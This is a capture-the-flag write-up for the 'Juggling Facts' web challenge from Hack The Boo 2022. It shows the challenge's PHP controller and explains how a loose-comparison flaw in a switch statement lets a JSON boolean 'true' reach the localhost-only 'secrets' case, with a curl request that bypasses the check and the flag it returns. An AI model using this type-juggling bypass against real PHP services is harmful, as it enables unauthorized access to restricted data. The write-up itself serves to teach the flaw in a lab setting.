# Hack The Boo 2022

## Juggling Facts

> An organization seems to possess knowledge of the true nature of pumpkins. Can you find out what they honestly know and uncover this centuries-long secret once and for all?
>
>  Author: N/A
>
> [`web_juggling_facts.zip`](web_juggling_facts.zip)

Tags: _web_

## Preparation

Looking through the source code there is one interessting endpoint found ```api/getfacts``` that potentially will reveale a *secret*. The source code of the controller looks like this

```php
public function getfacts($router)
{
    $jsondata = json_decode(file_get_contents('php://input'), true);

    if ( empty($jsondata) || !array_key_exists('type', $jsondata))
    {
        return $router->jsonify(['message' => 'Insufficient parameters!']);
    }

    if ($jsondata['type'] === 'secrets' && $_SERVER['REMOTE_ADDR'] !== '127.0.0.1')
    {
        return $router->jsonify(['message' => 'Currently this type can be only accessed through localhost!']);
    }

    switch ($jsondata['type'])
    {
        case 'secrets':
            return $router->jsonify([
                'facts' => $this->facts->get_facts('secrets')
            ]);

        case 'spooky':
            return $router->jsonify([
                'facts' => $this->facts->get_facts('spooky')
            ]);

        case 'not_spooky':
            return $router->jsonify([
                'facts' => $this->facts->get_facts('not_spooky')
            ]);

        default:
            return $router->jsonify([
                'message' => 'Invalid type!'
            ]);
    }
}
```

## Solution

So calling secrets from non local address will just return a error message. But the switch statement has a little flaw. Php loose comparison evaluates ```true == "x"``` to ```true``` meaning, if ```type``` is just a bool with value ```true``` the first comparison succeeds and therefore will reveal the secrets.

```
$ curl -X POST -d '{"type":true}' http://161.35.164.157:32297/api/getfacts

{"facts":[{"id":19,"fact":"HTB{sw1tch_stat3m3nts_4r3_vuln3r4bl3!!!}","fact_type":"secrets"}]}
``

